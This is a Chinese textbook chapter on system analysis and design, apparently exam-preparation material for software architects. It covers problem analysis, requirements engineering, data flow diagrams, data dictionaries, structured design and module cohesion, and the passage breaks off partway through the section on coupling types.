系统分析与设计方法&emsp;&emsp;对于架构设计师而言，如何进行系统设计是其“看家本领”，而设计是在对系统进行分析的基础上进行的，否则，设计就是“无米之炊”。从软件开发项目中的角色分配来看，系统架构设计师应该在信息系统项目管理师的协调下，与系统分析师协同工作。## 8.1 定义问题与归结模型&emsp;&emsp;软件系统的目的是解决问题，因此在建模之初最重要的步骤是对问题的分析与定义，并在此基础上归结模型，这样才能够获得切实有效的模型。定义问题的过程包括：理解真实世界中的问题和用户的需要，并提出满足这些需要的解决方案的过程。### 8.1.1 问题分析&emsp;&emsp;问题分析的目标就是在开发之前对要解决的问题有一个更透彻的理解。为了达到这一目标，通常需要经过在问题定义上达成共识，理解问题的本质，确定项目干系人和用户，定义系统的边界和确定系统实现的约束这五个步骤。#### 1．在问题定义上达成共识&emsp;&emsp;要检验大家是否在问题的定义上达成了共识，最简单的方法就是把问题写出来，看看是否能够获得大家的认可。而要使得这个过程更加有效，应该将问题用标准化的格式写出来，根据 UP 的建议，应该包括以下几个方面的要素。1. 问题概述  &emsp;&emsp;用简短的几句话，将所理解的问题本质描述出来；2. 影响  &emsp;&emsp;说明该问题将会对哪些项目干系人（Stakeholder，风险承担者）产生影响；3. 结果  &emsp;&emsp;确定问题对项目干系人和商业活动会产生什么样的影响；4. 优点  &emsp;&emsp;概要性地提出解决方案，并列举出该解决方案的主要优点。&emsp;&emsp;在问题定义上达成共识，就能够有效地将开发团队的理解与用户的需求达成一致，这样就能够使得整个系统的开发沿着合理的方向发展。#### 2．理解问题的本质&emsp;&emsp;每一句描述都会夹杂着叙述者的个人理解和判断，因此透过表面深入本质，理解问题背后的问题，是问题分析阶段一个十分关键的任务。其中一种技术是“根本原因”分析，这是一种提示问题或其表象的根本原因的系统化方法。在实际的应用中，常使用`因果鱼骨图`和`帕累托图`两种方法。1. 因果鱼骨图  &emsp;&emsp;因果鱼骨图是一种有效的探寻问题根源的技术，它通过直观的图形找出问题或现象的所有潜在原因，从而追踪出问题的根源。它能够帮助人们将问题的原因而放在首位，提供了一种运用集体智慧解决问题的方法。在使用时，通常按照以下步骤进行。  &emsp;&emsp;将问题简明扼要地写在右边的方框里；  &emsp;&emsp;确定问题潜在原因的主要类别，将它们连到鱼的脊骨上；  &emsp;&emsp;用头脑风暴法寻找原因并归类。  &emsp;&emsp;下图是鱼骨图的一个示例。  ![鱼骨图示例](https://pic.lufer.cc/images/2021/03/15/sjMluQ.png)  2. 帕累托图。  &emsp;&emsp;帕累托图是采用直方图的形式，根据问题的相对频率或大小从高往低降序排列，帮助设计师将精力集中在重要的问题上。它为 80%的问题找到关键的 20%的原因，它可以一目了然地显示出各个问题的相对重要程度，有助于预防在解决了一些问题后，却使另外一些问题变得更糟的现象发生。在使用时，通常按照以下步骤进行。  &emsp;&emsp;明确问题：也就是前面达成共识的问题定义；  &emsp;&emsp;找出问题的各种可能原因：通常可以利用头脑风暴来收集意见，并通过参考以往积累的资料和运营的数据来综合分析；  &emsp;&emsp;选择评价标准和考察期限：最常用的评价标准包括频率（占总原因的百分比）和费用（产生的影响），而考察的期限则应具有相应问题的代表性，并不是越长越好；  &emsp;&emsp;收集各种原因发生的频率及费用数据；  &emsp;&emsp;将原因按照发生的频率或费用从大到小排列起来；  &emsp;&emsp;将原因排在横轴上，频率或费用排列在纵轴上，形成如下图所示的结果。  &emsp;&emsp;这样就能够将造成问题的关键原因捕获出来，以便指导设计出更符合需要、更能够解决问题的解决方案。  ![帕累托图示例](https://pic.lufer.cc/images/2021/03/15/sjMRgO.png)  #### 3．确定项目干系人和用户&emsp;&emsp;要想有效地解决问题，必须了解用户和其他相关的项目干系人（任何将从新系统或应用的实现中受到实质性影响的人）的需要。不同的项目干系人通常对问题有不同的看法和不同的需要，这些在解决问题时必须加以考虑。事实上，许多项目干系人就是系统的用户，这一部分通常是易于识别的；但还有一部分项目干系人是系统的间接用户，甚至只是受系统影响的商业结果，这一部分不易识别，但十分重要。  &emsp;&emsp;在寻找项目干系人时，可以思考：系统的用户是谁？系统的客户（购买者）是谁？还有哪些人会受到系统输出的影响？系统完成并投入使用后，有谁会对它进行评估？还有没有其他系统内部或外部的客户，他们的需要有没有必要去考虑？系统将来由谁来维护？#### 4．定义系统的边界&emsp;&emsp;系统的边界是指解决方案系统和现实世界之间的边界。在系统边界中，信息以输入和输出的形式流入系统并由系统流向系统外的用户，所有和系统的交互都是通过系统和外界的接口进行的。在定义系统的边界时，将世界分为两个部分：系统及与系统进行交互的事物。要描述系统的边界有两种方法：一种是结构化分析中的“上下文范围图”，另一种则是面向对象分析中的“用例模型”。1. 上下文范围图  &emsp;&emsp;也就是数据流图中的顶层图，它是一个反��领域信息的模型，能够清晰地显示出系统的工作职责和相邻系统的职责起止之处，从而让读者能够从宏观的层面去了解系统。下图就是一个描述“证券经纪人系统”的上下文范围图。  ![上下文范围图示例](https://pic.lufer.cc/images/2021/03/15/sjQmZ9.png)  2. 用例模型  &emsp;&emsp;用例模型则通过引入参与者来描述“和系统进行交互的事物”，只要识别了参与者，自然而然系统的界限就确定下来了。在寻找参与者时，可以思考以下问题：谁会对系统提供信息？谁会在系统中使用信息？谁会从系统中删除信息？谁将操作系统？系统将会在哪里被使用？系统从哪里得到信息？哪些外部系统要和系统进行交互？  &emsp;&emsp;然后，再根据每个参与者的功能需求，识别出代表系统功能的用例，从而界定系统的边界。而关于用例模型的更多细节，请参考 [8.4.3](#8.4.3-统一建模语言) 节。#### 5．确定系统实现的约束&emsp;&emsp;由于各种因素的存在，会对解决方案的选择造成一定的限制，称这种限制为约束。每条约束都将影响到最后的解决方案的形成，甚至会影响是否能够提出解决方案。  &emsp;&emsp;在考虑约束时，首先应该考察到不同的约束源，其中包括进度、投资收益、人员、设备预算、环境、操作系统、数据库、主机和客户机系统、技术问题、行政问题、已有软件、公司总体战略和程序、工具和语言的选择、人员及其他资源限制等。### 8.1.2 问题定义&emsp;&emsp;通过对问题进行细致周密的分析，就可以对其进行综合的定义。对于一个问题的完整定义，通常应包括目标、功能需求和非功能需求三个方面。#### 1．目标&emsp;&emsp;目标是指构建系统的原因，它是最高层次的用户需求，是业务上的需要，而功能、性能需求则必须是以某种形式对该目标做出贡献。在描述目标时，应该注意以下几个方面。* 优势：目标应该不仅仅是解决问题，还要提供业务上的优势；* 度量：不仅要说明业务的优势，而且还必须提供度量这种优势的标准；* 合理性：要确保完成解决方案所需的工作量少于所获得的业务优势，这才是合理的解决方案；* 可行性：要探寻能够满足度量标准的解决方案；* 可达成性：对于组织而言，是否具备获取该系统的技能，构建完成后是否能够操作它。&emsp;&emsp;例如，下面就是一个很好的目标描述的例子。>目标：在冬季道路养护支出上节省费用  >优势：减少除冰和道路养护的费用  >度量标准：除冰费用将在目前道路养护费用的基础上降低25%，冰对道路的损伤将降低50% #### 2．功能需求&emsp;&emsp;功能需求是用来指明系统必须做的事情，只有这些行为的存在，才有系统存在的价值。功能需求应该源于业务需求，它只与问题域相关，与解决方案域无关。也就是说，功能需求是在与用户或某个业务人员交谈时，他们所描述的内容是为了完成他们某部分的工作而必须做的事情。而在设计解决方案时，会遇到一些限制条件，这些东西也是“系统需求” 的一部分，不过应该是设计约束或非功能需求形式指定。  &emsp;&emsp;在规定功能需求时要注意其详细程度。由于这些需求是业务需求，因此应该由业务人员来验证。也就是说，用户应该能够指明系统要达到有用的程度，功能是否已经足够；考虑到工作的成果，它的功能是否正确。另外，在描述功能需求时，应该注意需求的二义性。而二义性主要体现在以下几个方面:1. 同名异义的词  &emsp;&emsp;在自然语言中存在许多同名但异义的词语，应该谨慎地排除它们带来的影响。2. 代词  &emsp;&emsp;在需求描述中，代词经常会产生指代不明的现象，应该尽量避免使用，而是换成主语及宾语。#### 3．非功能需求&emsp;&emsp;非功能需求是系统必须具备的属性，这些属性可以看作是一些使产品具有吸引力、易用、快速或可靠的特征或属性。非功能需求并不改变产品的功能，它是为工作赋予特征的。在识别功能需求和非功能需求时，有一种十分有用的思维模式：功能需求是以动词为特征的，而非功能性需求则是以副词为特征的。非功能需求主要包括以下几种:1. 观感需求  &emsp;&emsp;即产品外观的精神实质，也就是与用户界面的观感相关的一组属性。2. 易用性需求  &emsp;&emsp;也就是产品的易用性程度，以及特殊的可用性考虑，通常包括用户的接受率、因为引入该产品而提高的生产效率、错误率、特殊人群的可用性等指标。3. 性能需求  &emsp;&emsp;也就是关于功能实现要求有多快、多可靠、多少处理量及多精确的约束。例如：速度、精度、安全性、容量、值范围、吞吐量、资源使用效率、可靠性（平均无故障时间）、可用性（不停机时间）、可扩展性等。4. 可操作性需求  &emsp;&emsp;衡量产品的操作环境，以及对该操作环境必须考虑的问题。5. 可维护性和可移植性需求  &emsp;&emsp;期望的改变，以及完成改变允许的时间。6. 安全性需求  &emsp;&emsp;产品的安全保密性，通常体现为保密性、完整性和可获得性。7. 文化和政策需求  &emsp;&emsp;由产品的开发者和使用者所带来的特别需求。8. 法律需求  &emsp;&emsp;哪些法律和标准适用于本产品。## 8.2 需求分析与软件设计&emsp;&emsp;需求分析是软件生命周期中相当重要的一个阶段。根据 Standish Group 对 23000 个项目进行的研究结果表明，28%的项目彻底失败，46%的项目超出经费预算或者超出工期，只有约 26%的项目获得成功。需求分析工作在整个软件开发生命周期中有着十分重要的意义。而在这些高达 74%的不成功项目中，有约 60%的失败是源于需求问题，也就是差不多有一半的项目都遇到了这个问题，这一可怕的现象引起人们对需求分析的高度重视。需求分析阶段的主要任务是通过开发人员与用户之间的广泛交流，不断澄清一些模糊的概念，最终形成一个完整的、清晰的、一致的需求说明。  &emsp;&emsp;而当明确了用户的需求之后，下一步的任务就是对未来的软件系统进行设计，它是确定系统实现的关键工作。需求分析和设计的方法对软件开发过程而言是十分重要的，因此必须扎实地掌握它。  &emsp;&emsp;需求分析与软件设计是软件生存期中最重要的两个步骤，需求分析解决的是“做什么”的问题，系统设计则是解决“怎么做”的问题。### 8.2.1 需求分析的任务与过程&emsp;&emsp;需求分析所要做的工作是深入描述软件的功能和性能，确定软件设计的限制和软件同其他系统元素的接口细节，定义软件的其他有效性需求，细化软件要处理的数据域。用一句话概括就是：需求分析主要是确定待开发软件的功能、性能、数据、界面等要求。需求分析的实现步骤通常包括：`获取当前系统的物理模型`，`抽象出当前系统的逻辑模型`，`建立目标系统的逻辑模型`三个部分。具体来说，需求分析阶段的工作可以分成 4 个方面：1. 问题识别  &emsp;&emsp;用于发现需求、描述需求，主要包括功能需求、性能需求、环境需求、可靠性需求、安全保密需求、用户界面需求、资源使用需求、软件成本消耗与开发进度需求，以此来预先估计以后系统可能达到的目标。2. 分析与综合  &emsp;&emsp;就是对问题进行分析，然后在此基础上整合出解决方案。这个步骤经常是反复进行的，常用的方法有面向数据流的结构化分析方法（Structured Analysis，SA），面向数据结构的 Jackson 方法，面向对象的分析方法（Object Oriented Analysis，OOA），以及用于建立动态模型的状态迁移图和 Petri 网。3. 编制需求分析的文档  &emsp;&emsp;就是对已经确定的需求进行文档化描述，该文档通常称为《需求规格说明书》。4. 需求分析与评审  &emsp;&emsp;它是需求分析工作的最后一步，主要是对功能的正确性、完整性和清晰性，以及其他需求给予评价。#### 1．需求的分类&emsp;&emsp;软件需求就是系统必须完成的事及必须具备的品质。具体来说，软件需求包括功能需求、非功能需求和设计约束三方面内容。各种需求的概念示意图如下图所示。![需求概念示意图](https://pic.lufer.cc/images/2021/03/15/sxXJuF.png)* 功能需求  &emsp;&emsp;是指系统必须完成的那些事，即为了向它的用户提供有用的功能，产品必须执行的动作。* 非功能需求  &emsp;&emsp;是指产品必须具备的属性或品质，如性能、响应时间、可靠性、容错性、扩展性等。* 设计约束  &emsp;&emsp;也称为限制条件、补充规约，这通常是对解决方案的一些约束说明，例如必须采用国有自主知识版权的数据库系统，必须在 UNIX 操作系统之下运行等。&emsp;&emsp;除了这三种需求之外，还有业务需求、用户需求、系统需求这三个处于不同层面的概念，充分地理解这样的模型才能够更加清晰地理清需求的脉络。* 业务需求（Business Requirement）  &emsp;&emsp;是指反映组织机构或客户对系统、产品高层次的目标要求，通常问题定义本身就是业务需求。* 用户需求（User Requirement）  &emsp;&emsp;是指描述用户使用产品必须要完成什么任务，怎么完成的需求，通常是在问题定义的基础上进行用户访谈、调查，对用户使用的场景进行整理，从而建立从用户角度出发的需求。* 系统需求（System Requirement）  &emsp;&emsp;是从系统的角度来说明软件的需求，它包括用特性说明的功能需求、质量属性、非功能需求及设计约束。&emsp;&emsp;分析师经常围绕着“功能需求”来展开工作，而功能需求大部分都是从“系统需求” 的角度来分析与理解的，也就是用“开发人员”的视角来理解需求。但要想真正地得到完整的需求，仅戴上“开发人员”的眼镜是不够的，还需要“领域专家”的眼镜，要从更高的角度来理解需求，这就是“业务需求”；同时还应该更好地深入用户，了解他们的使用场景，了解他们的想法，这就是“用户需求”。这是一个理解层次的问题，并不仅仅是简单的概念。#### 2．需求工程&emsp;&emsp;需求工程就是包括创建和维护系统需求文档所必需的一切活动的过程，主要包括需求开发和需求管理两大工作。1. 需求开发  &emsp;&emsp;包括`需求捕获`、`需求分析`、`编写规格说明书`和`需求验证` 4 个阶段。在这个阶段需要完成确定产品所期望的用户类型、获取每种用户类型的需求、了解实际用户任务和目标及这些任务所支持的业务需求、分析源于用户的信息、对需求进行优先级分类、将所收集的需求编写成为软件规格说明书和需求分析模型、对需求进行评审等工作。2. 需求管理  &emsp;&emsp;通常包括`定义需求基线`、`处理需求变更`、`需求跟踪`等方面的工作。&emsp;&emsp;这两个方面是相辅相成的，需求开发是主线，是目标；需求管理是支持，是保障。换句话说，需求开发是努力更清晰、更明确地掌握客户对系统的需求；而需求管理则是对需求的变化进行管理的过程。#### 3．需求分析方法&emsp;&emsp;需求分析的方法可谓种类繁多，不过如果按照分解方式的不同，可以很容易地划分出几种类型。本节先从分析方法发展的历史，对其建立一个概要性的认识，在本章的后面几节中将详细说明最具有代表性的结构化分析与设计、面向对象分析与设计两种方法。1. 结构化分析方法  &emsp;&emsp;最初的分析方法都不成体系，而且通常都只包括一些笼统的告诫，在 20 世纪 70 年代分析技术发展的分水岭终于出现了。这时人们开始尝试使用标准化的方法，开发和推出各种名为“结构化分析”的方法论，而 Tom DeMacro 则是这个领域最有代表性和权威性的专家。2. 软系统方法  &emsp;&emsp;这是一个过渡性的方法论，并未真正流行过，它的出现只是证明了结构化分析方法的一些不足。因为结构化分析方法采用的相对形式化的模型不仅与社会观格格不入，而且在解决“不确定性”时显得十分无力。最有代表性的软系统方法是 Checkland方法。3. 面向对象分析方法  &emsp;&emsp;在 20 世纪 90 年代，结构化方法的不足在面对多变的商业世界时，显得更加苍白无力，这就催使了 OOA 的迅速发展。4. 面向问题域的分析（Problem Domain Oriented Analysis，PDOA）  &emsp;&emsp;现在又发现面向对象分析方法也存在着很多的不足，应运而生了一些新的方法论，PDOA 就是其中一种。不过现在还在研究阶段，并未广泛应用。### 8.2.2 如何进行系统设计&emsp;&emsp;在实践中，系统设计与其说是在设计，不如说是在选择和妥协。  &emsp;&emsp;系统目标包括但不限制于功能、性能、健壮性、开发周期、交付日期等。不幸的是，这些目标往往是矛盾的，提高软件性能直接意味着开发周期的增加、交付日期的推迟，盲目地增加功能可能导致性能降低，维护成本提高。  &emsp;&emsp;软件设计者的难题在于在如此众多的目标之间找到这个平衡点，并且明确知道如何设计能实现这个平衡，既可以让投资者觉得在预算之内，又能让用户相对满意。可行性分析阶段应该已经论述了这样一个平衡点，可是如果设计者发现没有这样一个平衡点，如同没有一个设计者能让人骑着自行车到月球上去，那么设计者只能提出放弃某个方面的过度要求，否则系统要遭受必然失败的命运。更多的情况是没有经验的设计者不知道是否存在这些平衡点，更不知道如何利用合理的设计及有效的工具来达到平衡。因此设计者需要了解可以解决问题的各种方案，并清楚知道各个方案的效果、成本、缺点，以及这些方案的区别，并在各种方案中进行选择。而这些，不是一个人能在一两天了解的。&emsp;&emsp;没有一个设计者会完全重新开始设计一个系统，他们总参考多个与目标系统相类似的系统，再从中进行甄别、取舍和补充来作为新系统的设计。要成为优秀的设计者，了解、掌握、消化、总结前人和自己以前的设计成果是最好的方法，这似乎也是唯一的方法。&emsp;&emsp;设计者的苦恼有时候和编程人员一样。计算机系统的发展如此迅速，解决方案也越来越多，如同编程语言的发展，同时，随着人类社会的进步，投资者和客户也提出了越来越高的要求，这又需要设计者不断学习、创造新的方案。&emsp;&emsp;但系统设计也并非没有规律可以遵循，人们在实践中发现优秀的系统设计一般在以下几个方面都很出色。1. 组件的独立性  &emsp;&emsp;审视自己设计的系统，是否做到了高内聚、低耦合？2. 例外的识别和处理  &emsp;&emsp;谁能保证系统使用者都精确按照使用说明书使用？3. 防错和容错  &emsp;&emsp;当网络中断、数据库崩溃这样的灾难性事件发生时，系统也跟着崩溃吗？&emsp;&emsp;而且，更幸运的是，也有一些技术能够改进系统设计，这些方法包括：降低复杂性、通过合约进行设计、原型化设计、错误树分析等。### 8.2.3 软件设计的任务与活动&emsp;&emsp;软件设计是一个把软件需求变换成软件表示的过程。最初这种表示只是描绘出软件的总体框架，然后再进一步细化，并在此框架中填入细节。#### 1.软件设计的两个阶段&emsp;&emsp;从工程管理角度，软件设计可以分为两个步骤：1. 概要设计  &emsp;&emsp;也称为高层设计，将软件需求转化为数据结构和软件的系统结构。例如，如果采用结构化设计，则将从宏观的角度将软件划分成各个组成模块，并确定模块的功能及模块之间的调用关系。2. 详细设计  &emsp;&emsp;也称为低层设计，将对结构表示进行细化，得到详细的数据结构与算法。同样的，如果采用结构化设计，则详细设计的任务就是为每个模块进行设计。#### 2．主要的设计方法比较&emsp;&emsp;在结构化设计风行的时代，主流的设计方法还包括 Jackson 方法和 Parnas 方法。结构化方法侧重于“模块相对独立且功能单一，使模块间联系弱、模块内联系强”；而 Jackson 方法则是从数据结构导出模块结构；Parnas 方法的主要思想则是将可能引起变化的因素隐藏在有关模块内部，使这些因素变化时的影响范围受到限制，它只提供了重要的设计准则，但没有规定出具体的工作步骤。  &emsp;&emsp;而近年来，对象技术凭借其对数据的高效封装及良好的消息机制，实现了高内聚、低耦合的系统设计，成了现代软件设计的主流方法学。## 8.3 结构化分析与设计&emsp;&emsp;结构化分析与设计方法是一种面向数据流的需求分析和设计方法，它适用于分析和设计大型数据处理系统，是一种简单、实用的方法，曾获得广泛的应用。### 8.3.1 结构化分析&emsp;&emsp;结构化分析方法的基本思想是自顶向下逐层分解。分解和抽象是人们控制问题复杂性的两种基本手段。对于一个复杂的问题，人们很难一下子考虑问题的所有方面和全部细节，通常可以把一个大问题分解成若干个小问题，每个小问题再分解成若干个更小的问题，经过多次逐层分解，每个最底层的问题都是足够简单、容易解决的，于是复杂的问题也就迎刃而解了。这个过程就是分解过程。  &emsp;&emsp;结构化分析与面向对象分析方法之间的最大差别是：结构化分析方法把系统看作一个过程的集合体，包括人完成的和电脑完成的；而面向对象方法则把系统看成一个相互影响的对象集。结构化分析方法的特点是利用数据流图来帮助人们理解问题，对问题进行分析。  &emsp;&emsp;结构化分析一般包括以下工具：数据流图（Data Flow Diagram，DFD）、数据字典（DataDictionary，DD）、结构化语言、判定表、判定树。在接下来的部分将对它们一一做简单介绍。  &emsp;&emsp;结构化系统分析方法从总体上来看是一种强烈依赖数据流图的自顶向下的建模方法。它不仅是需求分析技术，也是完成需求规格化的有效技术手段。####  1．结构化分析的工作步骤&emsp;&emsp;在介绍具体的结构化分析方法之前，先对如何进行结构化分析做一个总结性描述，以帮助大家更好地应用该方法。1. 研究“物质环境”  &emsp;&emsp;首先，应画出当前系统（可能是非计算机系统，或是半计算机系统）的数据流图，说明系统的输入、输出数据流，说明系统的数据流情况，以及经历了哪些处理过程。在这个数据流图中，可以包括一些非计算机系统中数据流及处理的命名，例如部门名、岗位名、报表名等。这个过程可以帮助分析员有效地理解业务环境，在与用户的充分沟通与交流中完成。2. 建立系统逻辑模型  &emsp;&emsp;当物理模型建立完成之后，接下来的工作就是画出相对于真实系统的等价逻辑数据流图。在前一步骤建立的数据流图的基础上，将所有自然数据流都转成等价的逻辑流，例如，将现实世界的报表存储在计算机系统中的文件里；又如将现实世界中“送往总经理办公室”改为“报送报表”。3. 划清人机界限  &emsp;&emsp;最后，确定在系统逻辑模型中，哪些将采用自动化完成，哪些仍然保留手工操作。这样，就可以清晰地划清系统的范围。#### 2．数据流图&emsp;&emsp;DFD 是一种图形化的系统模型，它在一张图中展示信息系统的主要需求，即输入、输出、处理（过程）、数据存储。由于从 DFD 中可以很容易地看出系统紧密结合的各个部分，而且整个图形模式只有 5 个符号需要记忆，所以深受分析人员的喜爱，因而广为流行。&emsp;&emsp;如下图所示，DFD 中包括以下几个基本元素。![数据流图符号集](https://pic.lufer.cc/images/2021/03/15/y9AVgS.png)* 过程  &emsp;&emsp;也称为加工，一步步地执行指令，完成输入到输出的转换。  * 外部实体  &emsp;&emsp;也称为源/宿，系统之外的数据源或目的。  * 数据存储  &emsp;&emsp;也称为文件，存放数据的地方，一般是以文件、数据库等形式出现。  * 数据流  &emsp;&emsp;从一处到另一处的数据流向，如从输入或输出到一个过程的数据流。  * 实时连接  &emsp;&emsp;当过程执行时，外部实体与过程之间的来回通信。  1. 数据流图的层次  &emsp;&emsp;正如前面提到的，结构化分析的思路是依赖于数据流图进行自顶而下的分析。这也是因为系统通常比较复杂，很难在一张图上将所有的数据流和加工描述清楚。因此，数据流图提供一种表现系统高层和低层概念的机制。也就是先绘制一张较高层次的数据流图，然后在此基础上，对其中的过程（处理）进行分解，分解成为若干独立的、低层次的、详细的数据流图，而且可以这样逐一地分解下去，直至系统被清晰地描述出来。  ![数据流图的层次](https://pic.lufer.cc/images/2021/03/15/y9Al40.png)  2. Context图  &emsp;&emsp;Context 图，也就是系统上下文范围关系图。这是描述系统最高层结构的 DFD 图。它的特点是，将整个待开发的系统表示为一个过程，将所有的外部实体和进出系统的数据流都画在一张图中。  ![Context图实例](https://pic.lufer.cc/images/2021/03/15/y9Atu4.png)   &emsp;&emsp;Context 图用来描述系统有什么输入、输出数据流，与哪些外部实体直接相关，可以把整个系统的范围勾画出来。3. 逐级分解  &emsp;&emsp;当完成了 Context 图的建模之后，就可以在此基础上进行进一步的分解。以Context图实例为例，进行再分解，在对原有流程了解的基础上，可以得到如下图所示的结果。  ![DFD 0层图实例](https://pic.lufer.cc/images/2021/03/15/y9AcKe.png)  &emsp;&emsp;上图是在 Context 图的基础上做的第一次分解，而在 Context 图中只有一个过程，那就是系统，将其编号为 0。而接下来对 Context 图进行的分解，其实就是对这个编号为0的过程进行更细化的描述，在这里引入了新的过程、数据存储，为了能够区分其位置的级别，在这层次上的过程将以 1、2、3 为序列进行编号。  &emsp;&emsp;由于这是对过程 0 的分解，因此也称之为 DFD 0 层图。而可以根据需要对 DFD 0 层图上的过程（编号为 1、2、3）进行类似的分解，那么就称之为 DFD 1 层图，在 DFD 1 层图中引入的新过程，其编号规则就是 1.1，1.2…，以及 2.1，2.2…，以此类推，直到完成分析工作。  &emsp;&emsp;另外，这里存在一个很关键的要点，那就是 DFD 0 层图是 Context 图的细化，因此所有的输入和输出应该与 Context 图完全一致，否则就说明存在着错误。4. 如何画 DFD   &emsp;&emsp;DFD 的绘制是一个自顶向下、由外到里的过程，通常按照以下几个步骤进行。      * 画系统的输入和输出      &emsp;&emsp;就是在图的边缘标出系统的输入、输出数据流。这一步其实是决定研究的内容和系统的范围。在画的时候，可以先将尽可能多的输入、输出画出来，然后再删除多余的，增加遗漏的。      * 画数据流图的内部      &emsp;&emsp;将系统的输入、输出用一系列的处理连接起来，可以从输入数据流画向输出数据流，也可以从中间画出去。    * 为每一个数据流命名      &emsp;&emsp;命名的好坏与数据流图的可理解性密切相关，应避免使用空洞的名字。    * 为加工命名      &emsp;&emsp;注意应该使用动宾短语。#### 3.细化记录 DFD 部件&emsp;&emsp;为了更好地描述 DFD 的部件，结构化分析方法还引入了数据字典、结构化语言及决策树、决策表等方法。通过使用这些工具，能对数据流图中描述不够清晰的地方进行有效的补充。其中数据字典应用最为广泛，下面将详细说明数据字典的相关使用方法。  &emsp;&emsp;数据字典技术是一种很实用、有效的表达数据格式的手段。它是对所有与系统相关的数据元素的一个有组织的列表和精确严格的定义，使得用户和系统分析员对于输入、输出、存储成分和中间计算机有共同的理解。通常数据字典的每一个条目中包括以下信息。1. 名称  &emsp;&emsp;数据或控制项、数据存储或外部实体的主要名称，如果有别名的还应该将别名列出来。2. 何处使用/如何使用  &emsp;&emsp;使用数据或控制项的加工列表，以及如何使用。3. 内容描述  &emsp;&emsp;说明该条目的内容组成，通常采用以下符号进行说明。      * =：由…构成      * +：和，代表顺序连接的关系      * [ | ]：或，代表从中选择一个      * {}*：n 次重复      * （）：代表可选的数据项      * \*…\*：表示特定限制的注释  4. 补充信息  &emsp;&emsp;关于数据类型、默认值、限制等信息。下面就是一个数据字典的实例：> 客户基本信息=客户编号+客户名称+身份证号码+手机+家庭电话  > 客户编号 = {0…9}8  > 客户名称 = {字}4  > 身份证号码 = [{0…9}15|{0…9}18]  > 手机 = [{0…9}11|{0…9}12]  > 家庭电话 =（区号）+本地号区号 = {0…9}4  > 本地号 = [{0…9}7|{0…9}8]  ### 8.3.2 结构化设计&emsp;&emsp;结构化设计包括架构设计、接口设计、数据设计和过程设计等任务。它是一种面向数据流的设计方法，是以结构化分析阶段所产生的成果为基础，进一步自顶而下、逐步求精和模块化的过程。#### 1．概要设计与详细设计的主要任务&emsp;&emsp;概要设计阶段的主要任务是设计软件的结构、确定系统是由哪些模块组成，以及每个模块之间的关系。它采用结构图（包括模块、调用、数据）来描述程序的结构，此外还可以使用层次图和 HIPO（层次图加输入/处理/输出图）。  &emsp;&emsp;整个过程主要包括：复查基本系统模型、复查并精化数据流图、确定数据流图的信息流类型（包括交换流和事务流）、根据流类型分别实施变换分析或事务分析、根据软件设计原则对得到的软件结构图进一步优化。  &emsp;&emsp;而详细设计阶段的主要任务则是确定应该如何具体地实现所要求的系统，得出对目标系统的精确描述。它采用自顶向下、逐步求精的设计方式和单入口单出口的控制结构。常使用的工具包括程序流程图、盒图、PAD（Problem Analysis Diagram，问题分析图）、PDL（ProgramDesign Language，程序设计语言）。#### 2．结构图&emsp;&emsp;如下图所示，结构图的基本成分包括模块、调用（模块之间的调用关系）和数据（模块间传递及处理数据信息）。![结构图的基本成分](https://pic.lufer.cc/images/2021/03/15/y98F1J.png)&emsp;&emsp;结构图是在需求分析阶段产生的数据流图的基础上进行进一步的设计。它将 DFD 图中的信息流分为两种类型。* 变换流  &emsp;&emsp;信息首先沿着输入通路进入系统，并将其转换为内部表示，然后通过变换中心（加工）的处理，再沿着输出转换为外部形式离开系统。具有这种特性的加工流就是变换流。* 事务流  &emsp;&emsp;信息首先沿着输入通路进入系统，事务中心根据输入信息的类型在若干个动作序列（活动流）中选择一个执行，这种信息流称为事务流。#### 3．程序流程图和盒图&emsp;&emsp;程序流程图和盒图都是用来描述程序的细节逻辑的，其符号如下图所示。![程序流程图和盒图基本符号示意图](https://pic.lufer.cc/images/2021/03/15/y98JBt.png)&emsp;&emsp;程序流程图的特点是简单、直观、易学，但它的缺点也正是由于其随意性而使得画出来的流程图容易成为非结构化的流程图。而盒图正是为了解决这一问题设计的，它是一种符合结构化程序设计原则的图形描述工具。  &emsp;&emsp;盒图的主要特点是功能域明确、无法任意转移控制、容易确定全局数据和局部数据的作用域、容易表示嵌套关系、可以表示模块的层次结构。但它也带来了一个副作用，那就是修改相对比较困难。#### 4．PAD 和 PDL&emsp;&emsp;PAD 是问题分析图的缩写，它符合自顶向下、逐步求精的原则，也符合结构化程序设计的思想，它最大的特点在于能够很方便地转换为程序语言的源程序代码。&emsp;&emsp;PDL 则是语言描述工具的缩写，它和高级程序语言很相似，也包括数据说明部分和过程部分，还可以带注解等成分，但它是不可执行的。PDL 是一种形式化语言，其控制结构的描述是确定的，但内部的描述语法是不确定的。PDL 通常也被称为伪码。### 8.3.3 模块设计&emsp;&emsp;在结构化方法中，模块化是一个很重要的概念，它是将一个待开发的软件分解成为若干个小的简单部分——模块，每个模块可以独立地开发、测试。这是一种复杂问题的“分而治之”原则，其目的是使程序的结构清晰、易于测试与修改。  &emsp;&emsp;具体来说，模块是指执行某一特定任务的数据结构和程序代码。通常将模块的接口和功能定义为其外部特性，将模块的局部数据和实现该模块的程序代码称为内部特性。而在模块设计时，最重要的原则就是实现信息隐蔽和模块独立。模块经常具有连续性，也就意味着作用于系统的小变动将导致行为上的小变化，同时规模说明的小变动也将影响到一小部分模块。#### 1．信息隐蔽原则&emsp;&emsp;信息隐蔽是开发整体程序结构时使用的法则，即将每个程序的成分隐蔽或封装在一个单一的设计模块中，并且尽可能少地暴露其内部的处理。通常将难的决策、可能修改的决策、数据结构的内部连接以及对它所做的操作细节、内部特征码、与计算机硬件有关的细节等隐蔽起来。通过信息隐蔽可以提高软件的可修改性、可测试性和可移植性，它也是现代软件设计的一个关键性原则。#### 2．模块独立性原则&emsp;&emsp;模块独立是指每个模块完成一个相对独立的特定子功能，并且与其他模块之间的联系最简单。保持模块的高度独立性，也是设计过程中的一个很重要的原则。通常用耦合（模块之间联系的紧密程度）和内聚（模块内部各元素之间联系的紧密程度）两个标准来衡量，设计的目标是高内聚、低耦合。模块的内聚类型通常可以分为 7 种，根据内聚度从高到低排序，如下表所示。|内聚类型|描述||----|----||功能内聚|完成单一功能，各个部分协同工作，缺一不可||顺序内聚|处理元素相关，而且必须顺序执行||通信内聚|所有处理元素集中在一个数据结构的区域上||过程内聚|处理元素相关，而且必须按特定的次序执行||瞬时内聚|所包含的任务必须在同一时间间隔内执行（如初始化模块）||逻辑内聚|完成逻辑上相关的一组任务||偶然内聚|完成一组没有关系或松散关系的任务|&emsp;&emsp;与此相对应的，模块的耦合性类型通常也分为 7 